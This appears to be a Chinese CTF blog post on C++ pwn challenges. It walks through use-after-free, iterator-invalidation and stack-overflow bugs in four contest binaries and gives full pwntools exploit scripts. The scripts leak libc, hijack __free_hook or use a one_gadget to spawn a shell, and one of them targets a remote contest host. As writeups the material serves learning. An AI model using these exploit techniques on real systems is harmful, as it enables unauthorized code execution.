---
title: C++ Pwn
date: 2022-01-09 17:11:17
tags:
    - c++ pwn
    - string类
    - vector类
    - new 和 delete
---

### 长安战役-pwn4

* 明显的UAF，思路就是劫持__free_hook

* 现在还没有了析c++的内存管理，从做题的过程来说，在new分配时不止会malloc一次，类似采用了某种数据结构，chunk的某一部分需要维持这种数据结构所以size没有那么准确。在delete时，也可能不只free一次。这应该说在malloc和free之上采用某种系统而形成了new和delete。

* 类似整体看，在new一个chunk之前，会先有一个较大的unsorted bin，每次分配从中切割一块。这使得泄露时就可先delete填满tcache之后，再次delete合并入unsorted_bin,之后在FD和BK域就可看到libc的地址。


* 漏洞点

```c

_DWORD *__fastcall del(info *this)
{
  if ( this->key )
//-------------------------------------------
    operator delete[](this->key);
//-------------------------------------------
  this->value = 0LL;
  this->edit_count = 0LL;
  return sub_3086(this);
}

```

```python
#!/usr/bin/env python2
from pwn import *

local = 1
debug = 1
binary = "./pwn4"
# lib = "/lib/x86_64-linux-gnu/libc.so.6"
lib = "./libc-2.31.so"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def add(id,key):
    sal("Your choice: ","1")
    sal("Your index: ",str(id))
    sal("Enter your name: ","Cat03")
    sal("Please input a key: ",key)
    sal("Please input a value: ",str(0x123456))

def free(id):
    sal("Your choice: ","4")
    sal("Your index: ",str(id))

def show(id):
    sal("Your choice: ","2")
    sal("Your index: ",str(id))

def edit(id,content):
    sal("Your choice: ","3")
    sal("Your index: ",str(id))
    sal("Enter your name: ","Cat03")
    sal("New key length: ","6")
    sal("Key: ",content)
    sal("Value: ",str(0x123456))


for _ in range(8):
    add(_,"A"*0x91)
for _ in range(6):
    free(_)
free(7)
show(7)
libc.address = r7f() - 96 - 0x10 - libc.sym["__malloc_hook"]

add(0,"A"*0x28)
add(1,"A"*0x28)
add(2,"A"*0x28)
add(3,"/bin/sh\x00")
free(0)
free(1)
free(2)

edit(2,p64(libc.sym["__free_hook"])[:6])
free(0)
info("libc base => 0x%x"%libc.address)
raw_input()
payload = p64(libc.sym["system"])
add(0,payload.ljust(0x28,"A"))
free(3)
sh()

# struct info
# {
#     char *key;
#     uint64_t value;
#     uint64_t edit_count;
#     int year;
#     int month;
#     int day;
#     int hour;
#     int minute;
#     int second;
# };
```

### 2021-西湖论剑-string-go

* 漏洞点

```c
__int64 __fastcall lative_func(__int64 a1)
{
    char* ptr;
    size_t len; 
    const void *src;
    void *des;
    int index;

    string str1;
    string str2;
    string str3;
    vector<string> v8;
    
    cout<<">>> ";
    cin>>index;    

    split(v8, str2);
    if ( v8.size && index <= 7 )
    {
        cout<<">>> ";
//-------------------------bug------------------------------ 
        ptr = &str2[index]; 
//-------------------------bug------------------------------
        cin>>ptr;
    }
    cout<<str2;
    cout<<">>> ";
    cin>>str1;
    len = str1.size();
    src = str1.c_str();
    des = str3.c_str(); // str3.length() < 0xf to make sure des land the stack install of heap
    memcpy(des, src, len);
    return a1;
}
```

* exp

```c
#!/usr/bin/env python
#_*_coding:utf-8_*_
import time
from pwn import *

local = 1
debug = 1
binary = "./string_go"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

sal(">>> ","3")
sal(">>> ","-8")
sal(">>> ","ABCDEFGHIJKL")
sa(">>> ","\xff\xff")
r(0x38)
canary = u64(r(8))
info("canary    => 0x%x"%canary)

r(0xb8)
libc.address = r7f() - 231 - libc.sym["__libc_start_main"]
info("libc base => 0x%x"%libc.address)

payload = ""
payload += "A"*(0x18-1)
payload += p64(canary)
payload += "B"*0x18
payload += p64(libc.address+0x4f3d5)

sal(">>> ",payload)

sh()


'''
$ one_gadget ./libc-2.27.so --level 1

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
...
'''
```
* 对string的测试

```c
#include<stdio.h>
#include<stdint.h>
#include<assert.h>

#include<string>
#include<iostream>

using namespace std;

/*
pwndbg> p/x sizeof(S)
$3 = 0x20

----------------------------------------------

**********************************************************************************
* pay attention to the buffer. 

pwndbg> p/x S.size()
$4 = 0xf
pwndbg> p/x S.capacity()
$4 = 0xf
pwndbg> telescope &S 4
00:0000│ rax rdi 0x7fffffffdbf0 —▸ 0x7fffffffdc00 ◂— '01234567+++++++'
01:0008│         0x7fffffffdbf8 ◂— 0xf
02:0010│         0x7fffffffdc00 ◂— '01234567+++++++'
03:0018│         0x7fffffffdc08 ◂— 0x002b2b2b2b2b2b2b  //'+++++++' 

**********************************************************************************


* If S.size() > 0xf ,it will allocate a chunk from heap 
* and treat it as the buffer. The first qword of former buffer will be capacity.


**********************************************************************************

pwndbg> p/x S.size()
$6 = 0x10
pwndbg> p/x S.capacity()
$5 = 0x1e
pwndbg> telescope &S 4
00:0000│  0x7fffffffdbf0 —▸ 0x615030 ◂— '01234567++++++++'
01:0008│  0x7fffffffdbf8 ◂— 0x10
02:0010│  0x7fffffffdc00 ◂— 0x1e
03:0018│  0x7fffffffdc08 ◂— 0x2b2b2b2b2b2b2b // '+++++++' 

**********************************************************************************

*** Describe the structure

struct item
{
	char *c_ptr;          // It points to the cache by default when size <=0xf,
						  // if size > 0xf,it points to a chunk allocated from heap;
	uint64_t size;
	union anything
	{
		char buffer[0x10];
		uint64_t capacity;
	}cache;
};

*** Test it

item *p = (item *)&S;
...
if(S.size()<=0xf)
{
	assert(p->c_ptr == S.c_str());
	assert(p->cache.buffer == S.c_str());

	assert(0xf == S.capacity());
}
else
{
	assert(p->c_ptr == S.c_str());
	assert(p->cache.capacity == S.capacity());
}

*/

int main() 
{
	string S("01234567");
	
	for(int i=0;i<0x100;i++)
	{
		S += '+';
		printf("%-10s => 0x%x\n","size",S.size());
		printf("%-10s => 0x%x\n","capacity",S.capacity());
		printf("-------------------------------------------\n");
	}
    
/*
*** change of capacity

capacity     => 0xf(stack) -> 0x1e(heap) -> 0x3c -> 0x78 -> 0xf0 -> 0x1e0
* tip : (0xf*2) = (0xf<<1) = 0x1e ; 0x1e<<1 = 0x3c ; 0x3c<<1 = 0x78

when execute mallo(size) in libc:
size         => 0x10(stack)-> 0x1f(heap) -> 0x3d -> 0x79 -> 0xf1 -> 0x1e1
* tip : size = capacity+1 ,  cuz the string need a bull byte ('\x00') to terminate itself.

*/
    return 0;
}
```


* 对vector的测试

```c
/*
****env*****
$ uname -a
Linux ubuntu 4.15.0-142-generic #146~16.04.1-Ubuntu SMP Tue Apr 13 09:27:15 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

$ g++ --version
g++ (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609

$ ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23
Copyright (C) 2016 自由软件基金会。
*/

#include<stdio.h>
#include<stdint.h>
#include<assert.h>

#include<vector>
#include<iostream>

using namespace std;
/*
* Declear as the following line
vector<char> V;

*** memory of V ***

00:0000│     0x7fffffffdbf0 —▸ 0x615c20 ◂— '+++++++++'
01:0008│     0x7fffffffdbf8 —▸ 0x615c29 ◂— 0x0
02:0010│     0x7fffffffdc00 —▸ 0x615c30 ◂— 0x0

-----------------------------------------------------------

size = ((char**)(&V))[1] - ((char**)(&V))[0];
capacity = ((char**)(&V))[2] - ((char**)(&V))[0];

assert(size == V.size() && capacity == V.capacity());
------------------------------------------------------------

struct item
{
	char* begin;
	char* current;
	char* end;
};
item* p = (item*)&V;
assert((int)(p->current-p->begin) == V.size() && (int)(p->end-p->begin == V.capacity()));

*/

int main() {
	vector<char> V;
	for(int i=0;i<0xff;i++)
	{
		V.push_back('+');

		printf("%-10s => 0x%x \n","sizeof(V)",sizeof(V));
		printf("%-10s => 0x%x \n","size",V.size());
		printf("%-10s => 0x%x \n","capacity",V.capacity());
		printf("%-10s => %p \n","begin",V.begin());
		printf("%-10s => %p \n","end",V.end());
		printf("-----------------------------------------\n");
	}
	getchar();
/*
*** count about

* capacity        => 0x1 -> 0x2 -> 0x4 -> 0x8 -> 0x10 -> 0x20 -> 0x40 -> 0x80 -> 0x100.....
thus:
* size of chuck   => sizeof(type) * (0x1 -> 0x2 -> 0x4 -> 0x8 -> 0x10 -> 0x20 -> 0x40 -> 0x80 -> 0x100.....)
*/
    return 0;
}
```
### 2021-BCTF-bytezoom

* 逆向了一个下午才弄出来。有几个奇怪的点
1. Cat和Dog都是只有`uint64_t age`和`string name`，但是却调转了方向，使得内存分布刚刚相反，这样设计很可能把dog当作cat处理，或者把cat当作dog处理。
![](https://i.niupic.com/images/2022/01/20/9TC2.png)
2. 按照子菜单中的提示对age的操作应该是change_age，在实现时却add_age，结合上一步如果把dog当作cat来add_age，add便是string name的ptr。
```cpp
unsigned __int64 __fastcall real_change_dog_age(unk_1428c *this)
{
  __int64 v1; // rax
  __int64 v2; // rax
  int v4; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  cout<<"Enter the number of years you want to add"<<endl;
  cin>>v4;
  if ( v4 <= 0 || v4 > 1279 )
  {
      cout<<"error"<<endl;
  }
  *(_QWORD *)(*(_QWORD *)this + 8LL) += v4; // add instead change
}
```
3. 在change_cat_name函数里，检测的却是是否select了dog。（这个并没有用到）
```cpp
unsigned __int64 change_cat_name(void)
{
  __int64 v1; // rax

  if ( select_one->dog )
    return real_change_cat_name((unk_1428c *)select_one);
  return cout<<endl;
}
```

* 漏洞点是UAF<br>
在select之后，退出子菜单，然后在select的object的索引处再添加一个替换他，应该是由于使用了shared_ptr来托管指针，当原指针不再被托管是就会析构这个对象。这就达到了select的这个object已经被free，如果此时再申请另一种动物，那么select一个dog，那么就可以以cat得方法来处理它。
* 利用<br>
泄露时：修改string得size，在show中一下leak出heap和libc。
利用时：修改string得c_ptr为free_hook,然后劫持它就可。

* exp

```python
#!/usr/bin/env python2
from pwn import *

local = 1
debug = 1
binary = "./bytezoom"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def add(type,index,name):
	sal("choice:","1")
	sal("cat or dog?",type)
	sal("input index:",str(index))
	sal("name:",name)
	sal("age:",str(0x40))

def manage():
	sal("choice:","3")

def manage_exit():
	sal("choice:","4")
def show(type,index):
	sal("choice:","2")
	sal("cat or dog?",type)
	sal("index:",str(index))

def select(type,index):
	sal("choice:","1")
	sal("cat or dog?",type)
	sal("index:",str(index))

def add_age(type,size):
	sal("choice:","2")
	sal("cat or dog?",type)
	sal("want to add",str(size))

def change_name(type,name):
	sal("choice:","3")
	sal("cat or dog?",type)
	sal("new name:",name)

add("cat",0,"C"*0x4)
add("dog",1,"D"*0x4)
manage()
select("dog",1)
manage_exit()
add("dog",1,"E"*0x4)
add("cat",1,"F"*0x4)

manage()
add_age("dog",0xf0)
select("cat",1)
change_name("cat","\x01\x11")
manage_exit()

add("dog",3,"3"*0x4)
add("dog",2,"D"*0x480)
add("dog",2,"D"*0x4)
show("dog",1)

ru("name:")
r(0x30)
heap = u64(r(8)) - 0x14cf0
libc.address = r7f() - 1328 - 0x10 - libc.sym["__malloc_hook"]

info("heap => 0x%x"%heap)
info("libc => 0x%x"%libc.address)

manage()
add_age("dog",0x78)
change_name("cat",p64(libc.sym["__free_hook"]-0x10))
select("dog",3)
change_name("dog","/bin/sh\x00"*2+p64(libc.sym["system"]))

sh()
```

### hgame-vector

```c
unsigned __int64 move_note(void)
{
  const char **v0; // rax
  _QWORD *v1; // rbx
  int v3; // [rsp+4h] [rbp-2Ch]
  __int64 i; // [rsp+8h] [rbp-28h] BYREF
  __int64 v5; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  puts("let's take a look at your notes");
  for ( i = std::vector<char *>::begin(&notes);
        ;
        __gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator++(&i, 0LL) )
  {
    v5 = std::vector<char *>::end(&notes);
    if ( !(unsigned __int8)__gnu_cxx::operator!=<char **,std::vector<char *>>(&i, &v5) )
      break;
    if ( *(_QWORD *)__gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator*(&i) )
    {
      v0 = (const char **)__gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator*(&i);
      puts(*v0);
      puts("is this one your want to move? [1/0]");
      printf(">> ");
      if ( (unsigned int)get_int() == 1 )
      {
        puts("which index you want move to?");
        printf(">> ");
        v3 = get_int();
        if ( v3 <= 0 )
        {
          puts("no way!");
        }
        else
        {
          if ( v3 > (unsigned __int64)std::vector<char *>::size(&notes) )
          {
            v5 = 0LL;
            std::vector<char *>::resize(&notes, v3 + 1, &v5);
          }
          if ( !*(_QWORD *)std::vector<char *>::operator[](&notes, v3) )
          {
            v1 = (_QWORD *)__gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator*(&i);
            *(_QWORD *)std::vector<char *>::operator[](&notes, v3) = *v1;
            *(_QWORD *)__gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator*(&i) = 0LL;
          }
          puts("done!");
        }
        return __readfsqword(0x28u) ^ v6;
      }
    }
  }
  return __readfsqword(0x28u) ^ v6;
}
```
* 漏洞点，for循环中有resize使得notes这个vector改变了这个堆块的位置，但是迭代器还指向原来的vector。
* 利用，move_note把第二个（index=1）的move到size之外就有个类似uaf之类的,可达到控制tcache_struct的效果。

* exp
```python
#!/usr/bin/env python
import string
import hashlib
import itertools
from pwn import *

local = 0
debug = 1
binary = "./vector"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("chuj.top","53026")
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def ggdb():
    cmd = ""
    cmd += "#!/bin/sh\n"
    cmd += "gdb -p `pidof %s` -q "%(binary)
    with open("./gdb.sh",'w') as f:
        f.write(cmd)
    os.system("chmod +x ./gdb.sh")
ggdb()

def add(index,size,content):
    sal(">> ","1")
    sal(">> ",str(index))
    sal(">> ",str(size))
    sa(">> ",content)

def show(index):
    sal(">> ","3")
    sal(">> ",str(index))

def free(index):
    sal(">> ","4")
    sal(">> ",str(index))

def move(src,des):
    sal(">> ","5")
    for _ in range(src):
        sal("is this one your want to move?","0")
    sal("is this one your want to move?","1")
    sal("which index you want move to?",str(des))
    
ru('sha256(????) == ')
hashval = r(64)
table = string.ascii_letters + string.digits + "_."
for one in itertools.product(table,repeat=4):
    one = "".join(one)
    if hashlib.sha256(one).hexdigest() == hashval:
        print("[+] sha256(%s) == %s"%(one,hashlib.sha256(one).hexdigest()))
        sl(one)
        break
else:
    print("[-] noting crack")

add(0,0x18,"A"*0x18)
add(1,0x18,"B"*0x18)
move(1,3)
# free(3)
move(1,5)
move(1,9)
move(1,13)
move(1,21)
move(1,29)
move(1,45)
move(1,61)

free(3)

add(2,0x88,"CCCCCCCC")
free(2)
free(5)

add(2,0x88,"CCCCCCCC")
free(2)
free(9)

add(2,0x88,"CCCCCCCC")
free(2)
free(13)

add(2,0x88,"CCCCCCCC")
free(2)
free(21)

add(2,0x88,"CCCCCCCC")
free(2)
free(29)

add(2,0x88,"CCCCCCCC")
free(2)
free(45)

add(2,0x88,"CCCCCCCC")
free(2)
free(61)

add(2,0x100,"A")
show(2)
libc.address = r7f() - 705 - 0x10 -libc.sym["__malloc_hook"]
info("libc base => 0x%x",libc.address)
free(2)

payload = p16(0x1)*0x40
payload += p64(libc.sym["__free_hook"]-8)
add(2,0x100,payload)
add(4,0x18,"/bin/sh\x00"+p64(libc.sym["system"]))
free(4)

sh()
```

* proof of work

```python
"""
i.e.
=== Proof Of Work ===
sha256("????v0iRhxH4SlrgoUd5Blu0") = b788094e2d021fa16f30c83346f3c80de5afab0840750a49a9254c2a73ed274c

Suffix: v0iRhxH4SlrgoUd5Blu0
Hash: b788094e2d021fa16f30c83346f3c80de5afab0840750a49a9254c2a73ed274c
"""
import itertools
import hashlib
import string

table = string.ascii_letters + string.digits + "._"

# suffix = input("Suffix: ")
# hashval = input("Hash: ")
suffix = ""
hashval = "642f25ce985e3a021a00c1cac336f84f8bc9c4c7dd2595c3cfe96a79a2e98d42"

for v in itertools.product(table, repeat=4):
    if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
        print("[+] Prefix = " + ''.join(v))
        break
else:
    print("[-] Solution not found :thinking_face:")

"""
i.e.
=== Proof Of Work ===
sha256(????) == 5be24fcbb8cb0d0ddd295f82b01f5797c61bae5be196f9250487b0e83bc1cd62
input your ????> 

Hash: 5be24fcbb8cb0d0ddd295f82b01f5797c61bae5be196f9250487b0e83bc1cd62
"""
import itertools
import hashlib
import string

table = string.ascii_letters + string.digits + "._"

hashval = raw_input()

for v in itertools.product(table, repeat=4):
    sum = ''.join(v)
    if hashlib.sha256(sum).hexdigest() == hashval:
        print("[+] sha256(%s) = %s"%(sum,hashlib.sha256(sum).hexdigest()) )
        break
else:
    print("[-] Solution not found :thinking_face:")


```

* tcache_double_free的饶过
```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
```


> 目前收集到几道c++的题，之后如果有时间会加到此处。